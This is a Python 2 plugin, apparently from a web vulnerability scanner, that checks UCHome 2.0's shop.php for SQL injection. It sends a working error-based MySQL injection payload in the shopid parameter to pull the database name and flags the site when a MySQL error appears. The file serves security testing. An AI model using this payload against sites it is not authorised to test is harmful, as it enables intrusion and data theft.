#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "shop.php?ac=view&shopid=253%20and(select%201%20from(select%20count(*),concat((select%20(select%20concat(0x7e,0x27,unhex(hex(database())),0x27,0x7e))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if content.find('MySQL Error:')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:uchome2_0sqlinjeciontscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:uchome2_0sqlinjeciontscript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def